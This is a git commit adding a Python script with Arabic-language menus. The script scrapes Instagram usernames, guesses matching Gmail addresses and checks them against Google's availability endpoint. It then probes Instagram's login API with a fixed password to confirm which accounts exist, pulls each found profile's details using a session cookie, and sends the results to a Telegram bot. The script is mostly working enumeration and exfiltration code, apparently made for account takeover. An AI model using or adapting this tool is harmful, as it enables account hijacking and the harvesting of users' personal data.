e3f947caf4fc67069d566385a278c0d1e58e842b
ehh41916-cyber <ehh41916@gmail.com>
2026-01-08 20:51:59 +0300

    Add files via upload

---
+++ Mt.py
@@ -0,0 +1,266 @@
+#--------------------[code-py-@SK_M2]---------------------------
+try:
+	import os , requests , random , time ,sys , names
+	import mechanize,time
+	import mechanize,datetime
+	import json
+	from user_agent import generate_user_agent
+	from uuid import uuid4
+	from time import sleep
+	uid = uuid4()
+except:
+	os.system("pip install requsets")
+	os.system("pip install names")
+	os.system("pip install datetime")
+	os.system("pip install user_agent")
+	os.system("pip install json")
+	os.system("pip install os")
+	os.system("pip install random")
+	os.system("pip install sys")
+	os.system("pip install mechanize")
+	os.system("pip install uid")
+	os.system("pip install datetime")
+	os.system("pip install uuid")
+	os.system("pip install uuid4")
+	os.system("pip install sleep")
+	os.system("clear")
+#---------------------[حمادي]-----[المكاتب]----------------------
+Z = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+F = '\033[2;32m' #اخضر
+C = "\033[1;97m" #ابيض
+Z1 = '\033[2;31m' #احمر ثاني
+B = '\033[2;36m'#سمائي
+Y = '\033[1;34m' #ازرق فاتح.
+C = "\033[1;97m" #ابيض
+E = '\033[1;31m'
+G = '\033[1;32m'
+S = '\033[1;33m'
+A = "\033[1;91m" #red
+C = "\033[1;97m" #white
+#---------------------[حمادي]-----[الالوان]----------------------
+
+now = datetime.datetime.today()
+
+now = datetime.datetime.today()
+mm = str(now.month)
+dd = str(now.day)
+yyyy = str(now.year)
+hour = str(now.hour)
+mi = str(now.minute)
+ss = str(now.second)
+t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
+
+
+hours = (now.hour)
+x = datetime.datetime.now()
+g= datetime.datetime(2022, 11, 11,00,00,0)
+
+if (x.strftime("%x"))>(g.strftime("%x")):
+ print('\n\n')
+ print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
+ print(" \033[1;33m༺ཌ༈ 2025 / 6 / 2 ༈ད༻    "+'تم ايقاف الاداه راجع قناتي لمزيد من المعلومات ⚠️')
+ print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
+ print('\033[2;32m id Telegram [@ooIleee]')
+ print('\033[2;32m id Channel [@oo9eeo]')
+ print('')
+ print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
+ 
+ sys.exit(0)
+ 
+
+if (x.strftime("%x"))==(g.strftime("%x")):
+   print('')
+   if(x.strftime("%X"))>(g.strftime("%X")):
+    print('\n\n')
+    print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
+    print(" \033[1;33m༺ཌ༈ 2025 / 6 / 2 ༈ད༻    "+'تم ايقاف الاداه راجع قناتي لمزيد من المعلومات ⚠️')
+    print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
+    print('\033[2;32m id Telegram [@ooIleee]')
+    print('\033[2;32m id Channel [@oo9eeo]')
+    print('')
+    print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
+    
+    sys.exit(0)
+   else:
+    print('')  
+else:
+    print('')
+print('')
+os.system("clear")
+def azz():	
+	azro = (f"""
+{Z}----------------------------------------
+{F} ID Channel {Z}//{S}@ooIleee
+{Z}----------------------------------------
+{S}
+ 💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀  
+ 💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀
+ 💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀
+ 💀💀💀💀💀💀💀ابو عكرب💀💀💀💀💀💀💀💀
+  💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀    
+ 💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀                                                                                          
+{Z}----------------------------------------
+{F} ID My  {Z}//{S}@oo9eeo
+{Z}----------------------------------------
+""")
+
+	for azr in azro.splitlines():
+		time.sleep(0.10)
+		print(azr)
+azz()
+token = input(f'{Z} [{F}√{Z}] {B}ENTER TOKEN{B}     : '+F)
+ID = input(f'{Z} [{F}√{Z}] {B}ENTER ID {B}       : '+F)
+sid = input(f'{Z} [{F}√{Z}] {S}INTER SEASON ID : ')
+head={'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sid}
+os.system("clear")
+def azz():	
+	azro = (f"""
+{Z}----------------------------------------
+{F} ID Channel {Z}//{S}@ooIleee
+{Z}----------------------------------------
+{S}
+ 💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀  
+ 💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀
+ 💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀
+ 💀💀💀💀💀💀💀ابو عكرب💀💀💀💀💀💀💀💀
+  💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀    
+ 💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀     
+{Z}----------------------------------------
+{F} ID My  {Z}//{S}@oo9eeo
+{Z}----------------------------------------
+""")
+
+	for azr in azro.splitlines():
+		time.sleep(0.10)
+		print(azr)
+azz()
+def check(email,user):
+ user=str(user)
+ email=str(email)
+ url='https://i.instagram.com/api/v1/accounts/login/'
+ headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
+                 'Cookie':'missing',
+                 'Accept-Encoding':'gzip, deflate',
+                 'Accept-Language':'en-US',
+                 'X-IG-Capabilities':'3brTvw==',
+                 'X-IG-Connection-Type':'WIFI',
+                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
+              'Host':'i.instagram.com'}
+ data = {'uuid':uid,  'password':'@LY_SK_M4',
+              'username':email,
+              'device_id':uid,
+              'from_reg':'false',
+              '_csrftoken':'missing',
+              'login_attempt_countn':'0'}
+ req= requests.post(url, headers=headers, data=data).json()
+ if req['message'] == 'The password you entered is incorrect. Please try again.':
+	 rr=requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis',headers=head).json()  
+	 nam = str(rr['graphql']['user']['full_name'])
+	 iddd = str(rr['graphql']['user']['id'])
+	 fol = str(rr['graphql']['user']['edge_followed_by']['count'])
+	 fols =str(rr['graphql']['user']['edge_follow']['count'])
+	 isp = str(rr['graphql']['user']['is_private'])
+	 bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
+	 re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
+	 ree = re.json()
+	 dat = ree['date']
+	 tlg =(f"""
+ـ𖤍 حمادي صادلك متاح  𖤍
+*********************************ـ
+🤷‍♂️ الاسم » {nam}
+🪧 اليوزر » @{user}
+📧 الايميل » {email}
+👨‍👩‍👦 المتابعين » {fols}
+👨‍👩‍👦‍👦 اليتابعهم » {fol}
+💳 الانشاء » {dat}
+🖼 المنشورات » {bio}
+🌍 الرابط » https://www.instagram.com/{user}
+*********************************ـ
+المبرمج » @ooIleee - @oo9eeo ـ""")
+	 print(Z+tlg)
+	 requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
+ if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
+	 print(f""" {Z}(☠️) WRONG INSTA :  {email} """)
+	 
+def zaid1():
+ print(Z+
+	'━━━━━━━━━━━━━━━━━━━━━━━━━ ')
+ while True:
+#  mal=['male','femal']
+#  gen=random.choice(mal)
+  user='1234567890qwertyuiopasdfghjklzxcvbnm.'
+  num='56789'
+  rng=int("".join(random.choice(num)for i in range(1)))
+  name=str("".join(random.choice(user)for i in range(rng)))
+  whisper=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=head).json()
+  mn=0
+  try:
+   while True:
+    mn += 1
+    user=str(whisper['users'][mn]['user']['username'])
+    with open('email.txt', 'a') as (HACKED):
+    	HACKED.write(f'{user}\n')
+    	print(F+user)
+  except IndexError:
+  	print(Z+'STOP Event Error ')
+  	
+def zaid2():
+ print(Z+
+	'━━━━━━━━━━━━━━━━━━━━━━━━━ ')
+ fil="email.txt"
+ file=open(fil,"r").read().splitlines()
+ for us2 in file:
+ 	emai=us2
+ 	email=emai.split('@')[0]
+ 	email=email+'@gmail.com'
+ 	url = 'https://android.clients.google.com/setup/checkavail'
+ 	h = {
+		'Content-Length':'98',
+		'Content-Type':'text/plain; charset=UTF-8',
+		'Host':'android.clients.google.com',
+		'Connection':'Keep-Alive',
+		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
+		}
+ 	d = json.dumps({
+		'username':email,
+		'version':'3',
+		'firstName':'AbaLahb',
+		'lastName':'AbuJahl'
+	})
+ 	res = requests.post(url,data=d,headers=h)
+ 	if res.json()['status'] == 'SUCCESS':
+ 		 print(f""" {F}(☠️) GOOD GMAIL  :  {email} """)
+ 		 email=email
+ 		 user=email.split('@gmail.com')[0]
+ 		 check(email,user)
+ 	else:
+ 	   print(f""" {S}(☠️) WRONG GMAIL :  {email} """)
+ 	   
+ 	   
+def zaid3():
+	file = 'email.txt'
+	fuck = open(file, 'r')
+	os.system(f'rm -rf {file}')
+	home()
+def home():
+	print(Z1+
+	'╔━━━━━━━━━━━━━━━━━━━━━━━━━')
+	print(f'{Z1}┃{Z}{X}┃1┃ {Z}{B} GET COMBO ')
+	print(f'{Z}┃{S}━━━━━━━━━━━━━━━━━━━━━━━━ ')
+	print(f'{Z1}┃{Z}{X}┃2┃ {Z}{B} Check Gmail ')
+	print(f'{Z}┃{S}━━━━━━━━━━━━━━━━━━━━━━━━ ')
+	print(f'{Z1}┃{Z}{X}┃3┃ {Z}{F} 🗑Delete Combo  ')
+	print(f'{Z}┃{S}━━━━━━━━━━━━━━━━━━━━━━━━ ')
+		
+	tools = input((f'{Z} [{F}√{Z}] {B}INTER Number  {B}  : '+F))
+	
+	if tools == '1':
+		zaid1()
+	elif tools =='2':
+		zaid2()
+	elif tools=='3':
+		zaid3()
+home()
+#-------------------[ليبيا]-----[حمادي]--------------------
+#-------------------[ليبيا]-----[قناة المطورين ]--------------------
